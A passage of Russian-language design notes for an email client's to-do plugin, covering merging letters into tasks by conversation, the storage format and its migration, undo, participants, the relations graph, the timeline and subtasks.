Супер-VIP в кадре (ADR-0161). OT.vip держит второй набор — supers — и принимает в него адрес, только если он есть и в vip (хост лишнего не пришлёт, но кадр проверяет сам; super без vip не принимается); прежний кадр, не знающий поля super, просто видит VIP. Узлу супер-VIP вместе с data-vip="1" ставится data-svip="1"; подсказка лица (title) — «…, Супер-VIP», имя (aria-label) — прежнее «…, VIP»; у строки «Материалов» сразу за названием — видимое «✦ VIP» (<span class="sv-tag" aria-hidden="true"> со звёздочкой .sv-star и словом .sv-word), скрытое .vip-sr прежнее. Новых скрытых подписей нет. Наружу добавлен OT.vip.isSuper(address). Снятие уровня по vipChanged снимает data-svip и «✦ VIP». Стили — блок «Супер-VIP» в конце dist/style.css: токены --sv-* повторяют токены окна; кольцо — ::before снаружи лица (.face, .ava, .step-who; маска оставляет тонкое кольцо с зазором, медленно вращается), ореол — ::after, дышащая наружная тень; строка вложения — дышащий перламутр от левого края; звёздочка мерцает. Движутся только transform/opacity псевдоэлементов. prefers-reduced-motion — всё неподвижно; forced-colors — свет убран, у лица двойная обводка CanvasText, слово остаётся.

Задача из нескольких писем (ADR-0079)

Одна задача — это, как правило, одна переписка: письмо, ответ на него, уточнение, пересылка коллеге. До ADR-0079 задача держала ровно одно письмо (source?), и каждый клик «Добавить в задачи» на ответе заводил ещё одну задачу с той же темой. Теперь TodoItem.messages: TodoMessageSource[] — список писем в порядке добавления (первое — то, с которого задача началась), и есть два способа положить письмо в задачу. Оба идут через одну точку хранилища — TodoStore.attach(source, { taskId? }) → { item, created, attached } (прежний addFromMessage удалён).

Слияние по беседе — todo.addFromMessage. attach(source) без taskId ищет открытую (!completed) задачу, у которой уже есть письмо той же беседы, и добавляет письмо к ней; не нашёл — заводит новую задачу с названием из темы (как раньше). «Та же беседа» (sameConversation, порядок задан ADR-0088) — обязательно тот же ящик (accountId), а дальше первое сработавшее правило:

№ПризнакВывод
1conversationId есть у обеих сторон и совпадаетодно дело; дальше не смотрим. Exchange даёт его даже когда тему переписали
2совпал номер обращения — sharesTicketодно дело: трекер шлёт каждое уведомление отдельной перепиской
3номера есть у обеих сторон и разныеразные дела
4conversationId есть у обеих сторон и разныеразные дела: сервер их развёл, тема не имеет права склеить
5иначе — совпал subjectKey(subject) и он не пустодно дело; пустой ключ не совпадает ни с чем, письма «(без темы)» не сливаются

Шаги 2, 3 и 5 — это sameSubject из src/shared/subject-key.ts; хранилище задач правило не повторяет, а зовёт. Номер обращения может только соединить задачи и никогда не разделяет то, что сервер уже свёл в одну переписку.

subjectIdentity разбирает тему на текст и номера обращений: снимает метки ответа и пересылки (десяток языков, в т.ч. CJK без двоеточия), краевые приписки систем в квадратных скобках и **…** ([EXTERNAL], теги рассылок, грифы) — и вынимает номер обращения из текста, поэтому «ОБР-123456: Не работает принтер» и «Не работает принтер» дают один ключ. Круглые скобки частью упаковки не считаются: «Заявка на отпуск (Иванов)» и «(Петров)» — разные дела. Номером считается только то, что стоит как номер: в скобках, с двоеточием после или в начале темы, — «Бюджет Q3-2026» и «Куплю RTX-4090» не в счёт. Ключ в нижнем регистре, ≤ 500 символов. Модуль чистый и лежит в shared/: main группирует по нему задачи, композер берёт из него же stripReplyMarkers для темы ответа. Кандидатов несколько — берётся самая свежая открытая задача (файл хранит задачи новыми вверх, findIndex). Завершённая задача — история: новое письмо той же переписки заводит новую задачу, а не воскрешает старую.

По выбору пользователя — todo.attachToTask. attach(source, { taskId }) кладёт письмо в названную задачу независимо от темы и от того, завершена ли она — пользователь так решил; задачи с таким id нет → «Задача не найдена». Список для выбора отдаёт todo.pickTasks (main-window-only, обычный брокер), получая тот же снимок письма: открытые задачи, сначала те, где уже есть письмо этого ящика (accountId снимка), затем остальные — рукописные и других ящиков, любая открытая задача годится; внутри групп новые сверху; не больше PLUGIN_PICKER_MAX_CHOICES = 50; только { id, label: title } — без писем, сроков и дат. С ADR-0122 под каждой задачей идут её невыполненные пункты — { id: 'step:' + JSON.stringify([taskId, stepId]), label: step.title, parent: taskId } (id длиннее 128 отбрасываются); задача не отрезается от своих пунктов посреди списка: если задача влезает, а её пункты целиком — нет, пункты опускаются, а следующая задача, не влезающая сама, обрывает список. Выбранный targetId разбирает parseTarget: префикс step: (и нет задачи с таким id) — пара [taskId, stepId], parseTarget только разбирает («Некорректный пункт задачи»), а положить объект и отнести его к пункту — одна запись хранилища: attach/attachLink с { taskId, stepId }, где settleStep до записи проверяет пункт («Пункт не найден»), место в нём (MAX_REFS_PER_STEP) и объект по каноническому ключу (письмо — по Message-ID); отказ ничего не оставляет полу-положенным; toStep лишь называет пункт в исходе — «Добавлено к пункту «…»» (название до 40 символов). Так работают все четыре «Добавить к задаче…»: письмо, человек, встреча и объект другого плагина.

Дубль не добавляется. В обоих путях письмо, которое в задаче уже есть (sameLetter: тот же ящик и тот же internetMessageId, когда он известен у обеих сторон, иначе тот же messageId), второй раз не добавляется — ответ { attached: false, created: false }, файл не переписывается, кнопка показывает «Уже в задаче «…»». Потолок — MAX_MESSAGES_PER_TASK = 50 писем на задачу («В задаче слишком много писем»): переписка длиннее — это рассылка, а не задача. Общий лимит в 1000 задач проверяется только при создании новой.

Убрать письмо — todo.detachMessage { id, messageId } (main-window-only, из фрейма): TodoStore.detach фильтрует письмо из messages; задача остаётся — она может быть о других письмах или ни о каком. Письма в задаче нет → задача возвращается как есть, без записи.

Файл хранилища v5 и миграция. userData/plugin-data/com.outtalk.todo.json — { version: 5, items: TodoItem[], relations: TodoRelation[] }. validItem требует массив ≤ 50 валидных снимков писем (validSource; conversationId — непрозрачный токен OPAQUE_TOKEN, 1–512 символов без управляющих, не isValidItemId: в запрос провайдера он не подставляется, только сравнивается), ≤ 25 людей и встреч, отсутствие ключа source, и — с ADR-0089 — необязательные priority (из четырёх значений), note (≤ MAX_NOTE = 4000 без управляющих символов), updatedAt, completedAt. Для relations проверяется, что оба конца существуют среди задач, порядок канонический (a < b) и дублей нет: висячая связь — не то состояние, которое это хранилище производит, поэтому прочитать её значит не доверять файлу. Рядом с файлом задач лежат ещё три, к схеме не относящиеся и появившиеся с ADR-0094: com.outtalk.todo.base.<sha1 адреса ящика>.json — база переноса (последний прочитанный из ящика документ), com.outtalk.todo.anchor.json — память «какой ящик означал этот номер учётной записи в прошлый раз» и device.json — случайная метка этого устройства. Потеря базы или метки не ломает ничего: база восстановится на следующем обмене (ценой одного возможного возврата удалённого), метка заведётся заново.

Старые файлы читаются как есть и переводятся в память на лету в read(): v1 (source? на задаче, ADR-0058/ADR-0074) → одноэлементный messages, v2 → пустой links, v3 → пустой relations, v4 → как есть. На диск v5 попадает при первой записи, отдельного шага миграции нет, а до этого файл остаётся читаемым и старой версией приложения. Версию пришлось поднять из-за нового вида вложения (ADR-0092): незнакомый вид заставляет читателя отвергнуть файл целиком, а не одно вложение. Единственная точка записи — write(items, relations), и она отбрасывает связи к задачам, которых в записи нет.

Механика ADR-0074 — пописьменная и по всем копиям: remapMessageIds(accountId, moves) переписывает messageId у каждого письма каждой задачи ящика; repointLetter(accountId, messageId, patch, id?) чинит все копии письма во всех задачах за одну запись (ADR-0090: одно письмо может лежать в нескольких задачах, и вылеченная копия не должна уходить вперёд остальных), id лишь говорит, какую задачу вернуть; sourcesMissingIdentity(limit) перечисляет письма без internetMessageId (лимит — по письмам, не по задачам); todo.openMessage { id, messageId? } открывает названное письмо задачи, без messageId — первое.

Объект чужого плагина на задаче (ADR-0092). TodoExternalLink { kind: 'external', pluginId, key, title } — например, обращение Jira. Ядро его не интерпретирует: ни одной ветки «если это Jira» нет, ребро графа называется sharedExternal. Ящика у такого вложения нет, а личность — пара «владелец + ключ»; склеивает её attachmentIdentity в plugins/todo-identity.ts, и только она (с ADR-0094 правило живёт в отдельном модуле: его читают и хранилище, и слияние задач между устройствами, а две копии разошлись бы молча): кадр передаёт kind, key и pluginId отдельно.

Путь целиком: кадр-владелец зовёт нейтральную возможность со своим ключом (jira.itemActions { key }) → обработчик проверяет ключ, сам берёт подпись у своего сервера и зовёт ctx.showItemActions({ key, title }) → main пушит plugin:itemActions в главное окно, подставляя pluginId по вызывающему плагину → хост рисует диалог с действиями других плагинов из contributes.externalActions и запускает выбранное обычным plugin:hostAction (kind: 'external'). У плагина задач это todo.addFromExternal и todo.attachExternalToTask — обе hostOnly. Открывает объект владелец: todo.openExternal { id, key, pluginId } находит вложение на задаче и зовёт openPluginItem в брокере, где заново проверяется «включён, встроенный, ровно этот id»; у обработчика для этого есть необязательный хук openItem(key, ctx).

Вставленная ссылка становится тем же вложением (ADR-0107). В конце «Материалов» карточки задачи — тихая строка-поле «Привязать ссылку» (linkField в dist/panel.js, ввод ≤ 2048 символов, Enter или кнопка «Привязать», которая появляется, когда поле не пусто; у пустой задачи её раскрывает «Привязать ссылку» тихого списка, ADR-0160). Кадр не разбирает адрес и не называет владельца: todo.attachLink { id, url } (authorizePluginData, то есть главное окно или окно раздела «Задачи», ADR-0104) проверяет длину, зовёт зависимость resolveLink(url) — а её обслуживает хост, опрашивая плагины с contributes.links (см. выше) — и кладёт ответ как обычный TodoExternalLink { kind: 'external', pluginId, key, title }. Никакой отдельной «ссылочной» сущности в хранилище не заводится: узнанная ссылка неотличима от объекта, положенного через панель действий, и так же переносится, сливается и отменяется. Не узнал никто — not_found с текстом «Эту ссылку не узнал ни один раздел. Подключите нужный плагин в настройках или проверьте адрес»: вложение, которое нечем открыть, хуже честного отказа.

«Уже в задаче» читается, а не запоминается (ADR-0092). У действия в манифесте есть необязательное state: { capability } — рядом с picker и по тем же правилам. Хост зовёт эту возможность, когда рисует действия, с тем же снимком, который получит само действие; плагин задач отвечает todo.objectState → { attached, label }. Один вызов на плагин, а не на кнопку; отметку показывает только прямое действие — «Добавить к задаче…» остаётся рабочим, объект можно положить и во вторую задачу.

Обратная дорога: из письма в задачу (ADR-0099). У state есть второе необязательное поле — reveal: <capability>, «покажи, где объект лежит». Проверяется как picker и capability: не объявлена — действие выбрасывается целиком. Если действие показывает исход (объект уже там) и объявило reveal, клик зовёт её, а не само действие, и подпись об этом говорит («Уже в задаче «X» — открыть»). todo.revealObject ищет задачу тем же помощником, что и todo.objectState (один поиск на два вопроса: иначе значок «в задаче» и «открыть» разъехались бы молча) и зовёт ctx.openPlugin({ taskId }) — наружу уходит указатель, не задача. Ничего не нашлось — not_found. Дальше обычный путь plugin:open → AppShell → usePlugins.requestOpen → PluginHost → hostEvent: open кадру; кадр «Задач» переключается на ленту и открывает карточку, а если задачи в списке нет — сначала перечитывает список (её могли завести секунду назад на другом устройстве, ADR-0094), и только потом честно говорит, что её нет. С ADR-0152 кадр ещё и подводит ленту к задаче: OT.showTask(id) в boot.js ослабляет отбор, если тот прячет задачу (готовая при «Открытых» или открытая при «Готовых» → «Все»; фильтр из аналитики и поиск снимаются), и говорит об этом плашкой #notice. Потом OT.List.reveal(id) раскрывает свёрнутую группу задачи на время показа и после отрисовки ставит строку посередине контейнера ленты (см. «Свёрнутые группы и переход к задаче» ниже). Контракт с хостом не менялся: приходит тот же hostEvent: open { taskId }.

Люди на задаче (ADR-0089, ADR-0101). assignee и reporter — исполнитель и постановщик; participants: TodoPerson[] — все, кто в деле между ними (список, а не ячейка: «главного участника» не бывает; потолок MAX_PARTICIPANTS_PER_TASK = 12). В строке ленты они выстроены по смыслу: слева постановщик, справа исполнитель, между ними стрелка (.crew → .crew-flow → .crew-group, класс crew, а не people — последнее в этом же файле стилей занято аналитикой), участники сидят на той же стрелке группой, до трёх лиц внахлёст и дальше «+N». Добавляет и убирает участников карточка: todo.addParticipant { id, accountId, address, name } (повтор — «уже там», исполнителя и постановщика вторым кружком не заводят) и todo.removeParticipant { id, key }; оба через undoable, то есть отменяются. Ключ человека — адрес, а у записанного руками имя (personKey): у участника нет своей ячейки, поэтому и фотография, и карточка контакта спрашиваются по ключу (role: 'participant', key), а main проверяет, что такой человек на задаче есть. При переносе между устройствами участники сливаются как коллекция, а не как скаляр (ADR-0094): объединение за вычетом убранного относительно базы, пустой список не хранится. Выбираются как адресат в «Кому»: todo.findPeople { accountId, query } ищет в адресной книге ящика (тот же resolveRecipients, что подсказывает адресатов), но принимается и произвольный текст — тогда address пуст, а name несёт написанное. Ставит todo.setPerson { id, role, accountId, address, name } (пустые адрес и имя — снять). Ящик для людей (ADR-0116): кадр называет ящик задачи — accountFor в boot.js берёт номер из писем и ссылок задачи, затем из исполнителя и постановщика, затем из участников и исполнителей пунктов (кроме ext:). У задачи, заведённой руками без писем, ящика нет, и кадр шлёт пустой accountId. Тогда ящик выбирает main: peopleAccount в todo.ts зовёт deps.defaultAccount (задаётся в ipc/plugins.ts) — это единственный подключённый ящик, а при нескольких — отказ «Не понятно, в чьей адресной книге искать: подключено несколько ящиков», без угадывания. Так работают todo.findPeople, todo.setPerson, todo.addParticipant и todo.setSubtaskPerson; авторизация ящика дальше одна и та же, откуда бы он ни пришёл. В ленте видно только лицо: todo.personPhoto { id, role } отдаёт фотографию того, кто уже стоит на этой задаче — перебрать адресную книгу по одному адресу кадр не может; нет фотографии — инициалы. Кружок исполнителя пункта (ADR-0116) — в ленте и в карточке — берёт фотографию тем же путём (OT.Panel.withPhoto, роль subtask, ключ — номер пункта) и из того же кэша: один вопрос на человека, сколько бы его лиц ни было на экране. Спрашивает кадр по задаче с ролью, а кладёт в кэш по адресу: один человек стоит на пяти задачах, и это одно лицо. Пришедший снимок рисуется во все лица этого человека, какие сейчас на экране ([data-face="<адрес>"]), а не в тот узел, из которого был задан вопрос: пока ответ летел, лента успевала перерисоваться, узел оказывался выброшен — и фотография «иногда не показывалась». Отсутствие снимка тоже запоминается, иначе каждая перерисовка уходила бы в сеть за тем, чего нет. Само фото заполняет кружок целиком: .face — это <button> со своими отступами (1px 6px), и проценты считались от коробки содержимого (12×22 вместо 24×24 — прямоугольник, вписанный в круг), поэтому картинка позиционируется абсолютом от границы кнопки. Та же ловушка была у квадрата выбора и кружка «сделано» в строке: содержимое, которое шире коробки, браузер не центрирует, а прижимает к началу — галочка внутри кружка стояла на 3,5 px правее центра. У всех трёх padding: 0, и это держит todo-frame-editing.test.ts. Рядом — вторая половина той же истории: колонка под квадрат в сетке строки теперь 30 px (отступ 12 + квадрат 18), раньше 20 px, и квадрат вылезал наружу, съедая промежуток до кружка. Клик открывает карточку контакта через todo.openPerson { id, role }, и хост открывает её только про человека, который на задаче есть. С ADR-0116 тот же помощник main personOnTask знает роль subtask: кадр называет пункт, а не человека (key — id пункта), и todo.personPhoto/todo.openPerson отвечают только про исполнителя этого пункта — адрес кадр по-прежнему не называет.

Письмо ложится в задачу само (ADR-0093). Обе машины наблюдения сходятся в watcher'е, оттуда announceNewMail (main/mail-arrivals.ts), подписка — в ipc/plugins.ts. Обработчик получает необязательный хук onNewMail(accountId, messages) — не возможность и не host-действие: жеста человека нет. Плагин задач кладёт письмо по тому же sameConversation, но только в существующую незавершённую задачу (TodoStore.attachToExisting), не больше сорока писем из пачки, и только если задачу трогали за последние три месяца. У такого письма в снимке стоит auto: true. Выключается настройкой плагина в доверенном хосте.

Свои ответы — отдельная шина и отдельный хук (поправка к ADR-0093, 2026-10-07). Своё письмо из «Отправленных» — не прибытие: Exchange присылает NewMail только на доставку, а копия в «Отправленных» приходит событием Created и видна только локальному снимку папки. Подписка в ipc/plugins.ts общая с прибытием — deliverMail(hook, accountId, messages): setNewMailSink → onNewMail, setSentMailSink → onSentMail(accountId, messages) (BuiltinPluginHandler, plugins/builtin/types.ts; тот же статус и те же обещания, что у onNewMail: без жеста, без окна, не бросает, true — что-то записано → announcePluginChange). Выключенный плагин не получает ни того, ни другого. Плагин задач вешает на оба хука одну fileArrivals — те же ограничители и та же отметка auto. Записью считается только настоящее добавление (attachToExisting(...)?.attached): письмо, которое уже лежит в задаче, открытый раздел не будит. Ни уведомлений, ни счётчиков, ни события окна newMail у этой шины нет — их рассылает только watcher; новых запросов к серверу тоже нет, сравнение идёт по локальной базе ящика.

Отметка в списке писем (ADR-0093). contributes.messageListMarks = { capability, label } — точка вклада, проверяемая как picker/state. Список писем спрашивает todo.attachedMessages { accountId, ids } про видимую страницу (≤ 200 писем) при смене набора и по plugin:dataChanged; в почтовом коде не называется ни один плагин, а в доменной модели письма не появляется поля «в задаче». Отметка — значок в строке и ничего больше: счётчика «сколько писем ещё не разобрано» в шапке папки нет намеренно (см. ADR-0093 п. 9).

Отмена действий. Отменяемы todo.add, todo.update, todo.remove, todo.detachMessage, todo.detachLink, todo.attachLink, todo.relate, todo.moveAttachment, todo.merge, todo.split — каждая запоминает состояние, с которого начала. Стек живёт в памяти main (до пяти шагов и не больше 2000 задач суммарно, старое забывается первым) и исчезает при перезапуске: журнала на диске нет (ADR-0090).

Две тонкости, без которых отмена была бы опасной:

  • Чужие записи. В тот же файл пишет не только раздел: подтверждённый перенос письма чинит сохранённые ссылки, в фоне идёт дозапись личностей (ADR-0074). Поэтому каждый шаг помнит ревизию хранилища (счётчик записей, TodoStore.revision()), и restore(snapshot, expectedRevision) отказывается вернуть снимок, если с тех пор писал кто-то ещё: иначе отмена откатила бы починку, о которой никто не просил. Отказ очищает весь стек — всё, что ниже, ещё старее.
  • Поток правок. Заметка сохраняется каждые 700 мс набора; такие сохранения склеиваются в один шаг (тот же ключ, та же ревизия, не старше 20 секунд), поэтому «отменить» возвращает фразу, а не последнюю букву, и не стоит новой копии файла на каждое нажатие.

Все семь — main-window-only и ни одна не в hostOnly: hostOnly защищает от того, что кадр сочинит снимок письма, человека или встречи, а эти операции работают только с тем, что уже лежит в хранилище. Кадр называет вложение парой { kind, key } (для письма годится и messageId, и internetMessageId), а main ищет его на задаче-источнике и копирует найденный снимок; снимок из аргументов кадра не принимается нигде.

Карта связей — Canvas с затухающей силовой раскладкой в graph.js и HTML-поверхностями управления в graph.css. Карточная раскладка из прежнего редизайна удалена: сохранена исходная модель свободных островков и линий. Структура задач и причины их связей приходят из todo.graph; сами задачи и собственные объекты — из авторизованного todo.list. Кадр не вычисляет заново идентичность общих объектов. TodoGraphEdge.reasons — необязательная карта количеств; сумма причин равна weight. Для старого ответа главный вид и общий вес выводятся отдельно. Прежние ограничения main (5000 рёбер и отсечение объектов более чем на восьми задачах) сохранены; при усечении есть предупреждение.

Компоненты связности задают только начальный посев. Затем пространственная сетка считает отталкивание и столкновения, пружины — связи; симуляция затухает и RAF останавливается. Геометрия переживает изменения названия, данных и фильтров. Выбранный узел остаётся неподвижным, пока человек с ним работает. Перетаскивание начинается после пяти пикселей; отмена жеста не открывает задачу. Подписи экранные, расставляются с учётом столкновений и поверхностей управления. У selected, непосредственных соседей и главного хаба компоненты есть приоритет и запасные якоря с выносками. Поиск по DOM даёт дополнительный доступный путь к узлам.

Фокус устойчивый, а не hover: дальние узлы затухают до 4%, линии — примерно до 2%. У задачи раскрываются собственные спутники (taskObjects и подзадачи); реальные refs пунктов добавляют пунктир к их объектам. Это отдельные представления объектов конкретной задачи, не новый механизм общей идентичности. По умолчанию спутники появляются в фокусе; настройка включает их и в обзоре. Лимит спутников 1200 защищает кадр от чрезмерной нагрузки, о нём сообщает предупреждение; полный состав остаётся доступен в раскрываемом контексте. Отбор задач использует OT.matches, причины линий — логическое ИЛИ включённых видов.

Все действия идут через существующие OT.actions/OT.openObject и проверки OT.can/OT.guard, без новых разрешений и каналов IPC. Сохранение блокирует повторный запрос. Асинхронные чтения объединены в микрозадаче и защищены поколением: старый ответ и ответ после смены вкладки не заменяют свежую карту. В sessionStorage (todo.graph.constellation.*) живут камера, настройки и до 5000 позиций: только идентификаторы, координаты и закрепление, без содержимого задач. Разметка строится через DOM/textContent. Зависимости приложения не добавлены.

Свёрнутые группы и переход к задаче (ADR-0152). Заголовок группы ленты — button.group-head до края ленты: шеврон .chev (OT.icon('chevron'), повёрнут на −90° у свёрнутой), название, число .n и линия до края. Атрибуты: aria-expanded, aria-controls="group-body-<ключ>"; Enter и пробел работают как у любой кнопки. С ADR-0156 заголовок стоит внутри полосы div.group-bar: липкость (position: sticky; top: 0), фон-градиент и вертикальные отступы переехали на неё, а сам button.group-head растягивается flex: 1 — рядом с ним в той же полосе живёт button.seen-all, а кнопку в кнопку не вложить. Тело — div.group-body (role="region", aria-labelledby на заголовок) → div.group-inner → лента, плашка покоя и «+ Задача». Сворачивание анимирует grid-template-rows: 1fr → 0fr и прозрачность (0,26 с), поэтому высоту в пикселях мерить не нужно при любой длине группы. Переключение идёт на месте, без render(): setFolded() меняет классы collapsed/animating у той же секции. Пересобранная лента появилась бы сразу в конечном виде, и движения бы не было. Фокус остаётся на кнопке. overflow: hidden у .group-inner стоит только пока группа едет и пока свёрнута: у раскрытой группы свечение просрочки и подъём строки под курсором выходят за края. У свёрнутой тело получает inert и visibility: hidden, поэтому выпадает из Tab и из дерева доступности. Стрелки по строкам и Shift-выделение идут по visibleRows(), «N» берёт «+ Задача» первой раскрытой группы. Нити связей и дуга карточки (ADR-0121) строки свёрнутой группы не видят и пересчитываются, когда движение кончилось. У «Просрочено» в свёрнутом виде остаётся красный заголовок и число. «Уменьшить движение» — без анимации.

Где хранится. В localStorage кадра под ключом todo.groups.closed: { v: 1, boxes: { "<номер ящика>": ["today", "week"] } }. Источник у кадра свой (outtalk-plugin://com.outtalk.todo, standard-схема, allow-same-origin), хранилище лежит в профиле приложения на этом компьютере и переживает перезапуск. В main, в файл задач и в ящик ничего не едет, новой возможности брокера нет. Ящик — state.mailboxes[0].accountId, то есть ящик, в котором открыт раздел (ADR-0136); без ящика — полка ''. Храним только свёрнутые группы, поэтому по умолчанию группа раскрыта. Таймлайн — обзор и содержимое выбранной задачи. OT.Timeline.render() строит отдельный #view-timeline с двумя состояниями (data-timeline-level="overview" | "detail"). Начальное состояние — обзор только TodoItem, прошедших общий OT.matches. Карточка показывает название, начало заметки, приоритет, исполнителя и .timeline-content-summary: количество подзадач, выполненных пунктов/прогресс, уникальных связанных объектов и связей с другими задачами. Отдельных карточек вложений, названий подзадач и раскрытых списков связей в обзоре нет; срок пункта (ADR-0116) обзор тоже не меняет — пункты видны только внутри задачи. Нажатие на название или .timeline-drill — явный переход внутрь, а не открытие инспектора. Поиск по вложенному тексту оставляет в обзоре соответствующего родителя, не раскрывая его автоматически.

Личный таймлайн. detailId и стек history принадлежат только модулю представления, не схеме хранения. contents(item) собирает письма и ссылки выбранной задачи, все её subtasks и непосредственно связанные задачи из TodoRelation. Родитель остаётся шапкой .timeline-detail-header: название, срок, статус, заметка, состав и действия завершения/редактирования. Инспектор открывается явной кнопкой «Редактировать» или названием подзадачи. Вложения соседних и связанных задач в этот экран не подмешиваются. Связь related симметрична и не превращает одну из задач в дочернюю: обе остаются самостоятельными карточками обзора. Связанная задача показана на личной оси по своему сроку; нажатие открывает её собственный контекст. Обхода графа и рекурсивного раскрытия нет, поэтому циклические связи безопасны.

Даты и порядок. Обзор использует локальный календарный dueDate. В содержимом письма берут TodoMessageSource.date, встречи — TodoEventLink.start, связанные задачи — собственный dueDate. Проверка календарной части через parseDay → iso не даёт переполненному дню месяца превратиться в другую дату. ISO-момент переводится в день и часы часового пояса компьютера; дата без часов остаётся без времени. Группы идут по возрастанию, «Без даты» — последней. Внутри дня сначала задачи и записи без часов, затем объекты по моменту времени. Задачи одного дня упорядочены по завершённости, приоритету, времени создания и id; совпавшие моменты объектов разрешаются стабильным ключом. Подзадача с собственным dueDate (ADR-0116) стоит на оси в свой день — через тот же dueDay, что и задача, поэтому кривая дата уводит её в «Без даты»; подзадача без срока — в недатированной группе. В любой группе подзадачи идут после задач и перед объектами без часов, в исходном порядке (index), все сразу, без ограничения пятью. Даты создания задачи, связи или срок родителя не подставляются вместо отсутствующей даты объекта. Исходные массивы не сортируются. Просроченным (is-overdue) день делает прошедший срок незавершённой задачи или невыполненной подзадачи (ADR-0116), а не старое письмо или встреча. Подпись «Просрочено» и цвет дню дают и незавершённые задачи, и невыполненные пункты с прошедшим сроком (ADR-0116).

Типы содержимого. Локальный contentKind фильтрует только записи личного таймлайна: всё, подзадачи, письма, встречи, связанные задачи, контакты, внешние объекты. .timeline-content-filters — группа кнопок с aria-pressed, отдельными data-timeline-filter и счётчиками; глобальные фильтры обзора не меняются. contentToolbar строится по полному набору, даты — по выбранному, прогресс в шапке остаётся общим. Кнопки отсутствующих типов скрыты, кроме текущего выбора: при удалении последней записи он остаётся с нулём и доступным «Показать всё». Новый контекст начинается с «Всё»; история сохраняет тип вместе с прокруткой и фокусом.

Идентичность и действия. Объекты дедуплицируются в контексте выбранной задачи по JSON-кортежу из типа, учётной записи (для внешнего объекта — владельца pluginId) и attachmentKey/linkKeyOf. Письмо узнаётся по internetMessageId, при его отсутствии — по messageId; одинаковые id разных учётных записей не сливаются. Используется первая сохранённая копия метаданных, без дополнительных загрузок. openMessage/openLink вызываются от имени выбранной задачи, внешнюю ссылку разрешает владеющий плагин. Карточка подзадачи (.timeline-step) пишет статус: «Выполнено», «Срок · завтра» (относительный день из OT.stepWhen; тон today/overdue — атрибутом data-tone на строке, цвет — тот же, что у срока задачи) или «Без даты»; исполнитель пункта — строкой .timeline-meta с иконкой человека (ADR-0116). Квадратная кнопка пункта вызывает OT.actions.updateSubtask, не завершает родителя; круглая вызывает OT.actions.update. Оба действия используют обычную отмену, защищены от повторной отправки до ответа и разблокируются при ошибке. Счётчики отличают задачи, подзадачи и объекты. state.stepsClosed обычного списка не изменяется и не прячет содержимое явно открытого таймлайна.

Навигация, фильтры и обновления. Переход сохраняет id предыдущего контекста, локальный тип содержимого, scrollTop и клавиатурный фокус, закрывает прежний инспектор, ставит фокус на заголовок нового экрана. «Назад» и Escape возвращают предыдущий экран; Escape из поля ввода или открытого инспектора сохраняет прежнее поведение редактора. «Все задачи» возвращает сразу в обзор. Фокус после перерисовки восстанавливается по стабильному ключу записи и конкретному действию; удалённая запись передаёт его соседней или заголовку. Push и завершение родителя не закрывают его экран, даже если он больше не проходит прежний фильтр; удаление выбранной задачи возвращает к последнему сохранившемуся экрану истории, включая его прокрутку, тип и фокус; удалённые предшественники пропускаются. Изменение поиска, фильтра завершённости или фокуса аналитики сбрасывает навигацию и показывает новый обзор. Внутри выбранной задачи виден весь непосредственный контекст, включая завершённые связи и пункты вне поискового совпадения. Автосохранение инспектора с skipPanel и push не забирают фокус у внешнего редактора или поиска. Навигация переживает переключение вкладок в живом кадре; после пересоздания кадра таймлайн снова начинается с обзора.

Навигация .timeline-breadcrumbs стоит отдельным соседом шапки, чтобы position: sticky удерживал её на всей длине ленты, а не только в пределах карточки родителя. Имена в строке усекутся при нехватке места, полный текст доступен подписью/подсказкой. Escape обрабатывается capture-слушателем документа: он знает активный вид и приоритет поля ввода, инспектора, dialog[open] и меню. Поэтому закрытие инспектора не лишает следующую клавишу Escape возможности вернуться, даже если фокус оказался в body. Автовозврат по удалению не перехватывает фокус у поиска или внешнего редактора.

timeline.css ограничивает стили вида собственными классами, использует текущие токены светлой/тёмной темы и container queries. Шапка подробностей, счётчики и действия переносятся в узком кадре; фокус видим, а prefers-reduced-motion отключает переходы. Текст собирается через DOM/textContent и OT.highlight, без HTML из данных. API, схема, сетевые запросы, зависимости и остальные представления не меняются.

Пока в карточке пишут, её не трогает никто. Две вещи делали заметку нередактируемой, и обе — из-за того, что заметка не textarea, а редактируемый блок. Первая: перехватчики горячих клавиш спрашивали про имя тега (INPUT|TEXTAREA) и редактируемый блок не узнавали — «т» и «н» открывали новую задачу, «/» уводило фокус в поиск, пробел замораживал граф, Escape закрывал карточку прямо посреди фразы. Теперь «человек сейчас печатает» — одна общая проверка OT.typing(target) (имя тега или isContentEditable), и её зовут оба перехватчика: и общий в boot.js, и графовый. Вторая: карточку перерисовывала любая внешняя новость (hostEvent: dataChanged → reload()), в том числе приехавшее слияние задач (ADR-0094); перерисовка под курсором забирала фокус, и фраза дописывалась в никуда, а в задаче оставалось одно слово. Теперь Panel.render() при незаконченной правке той же карточки откладывает перерисовку (pending), а показывает отложенное flush() — когда фокус ушёл и ни одно сохранение не в пути (иначе перечитанная задача была бы без только что написанного). Смена карточки и её закрытие перерисовывают всегда. Договорённости держит todo-frame-editing.test.ts.

Пункты задачи (ADR-0102). subtasks?: TodoSubtask[] — шаги внутри дела: id, название, «сделано» и — с ADR-0116 — необязательные собственный срок dueDate (календарный день YYYY-MM-DD) и исполнитель assignee: TodoPerson. Формы и проверки у них те же, что у задачи (validDueDate, validPerson в validSubtasks), человек выбирается тем же поиском. Задачей пункт при этом не становится: заметки, постановщика, участников, писем и связей у него нет, в группах ленты, аналитике и графе отдельной строкой он не появляется — иначе это была бы вторая иерархия задач, от которой отказался ADR-0102. Идентификатор ставит хранилище: по названию пункты не сравниваются, иначе переименование на одном устройстве и отметка на другом дали бы два пункта. Потолок — MAX_SUBTASKS_PER_TASK = 30, название до 200 символов. Возможности: todo.addSubtask { id, title }, todo.updateSubtask { id, stepId, title?, done?, dueDate? }, todo.setSubtaskPerson { id, stepId, accountId, address, name }, todo.removeSubtask { id, stepId } — все через undoable, все за authorizePluginData() — главное окно или окно раздела «Задач» (ADR-0104). Пустой dueDate снимает срок, кривой отвергается; подпись отмены различает «Срок пункта изменён» и «Срок пункта снят». У самого пункта нет ни ящика, ни собственных прав, а у его исполнителя ящик есть. Поэтому todo.setSubtaskPerson идёт тем же путём, что todo.setPerson: assertLocalAccount отвергает ext:-ящик ещё до авторизации, затем ctx.authorizeAccount(accountId) проверяет ящик, в чьей адресной книге человека нашли (пустой accountId — ящик выбирает main, см. «Люди на задаче» выше). Пустые адрес и имя снимают исполнителя, произвольный текст — записанное руками имя (TodoStore.setSubtaskPerson → cleanPerson, как у задачи). В ленте пункты — отдельный элемент списка сразу после строки задачи (li.steps): строка задачи это сетка с жёсткими колонками, и шаги внутри неё стали бы ещё одной колонкой, а не продолжением. Галочка отмечает прямо в ленте, клик по названию 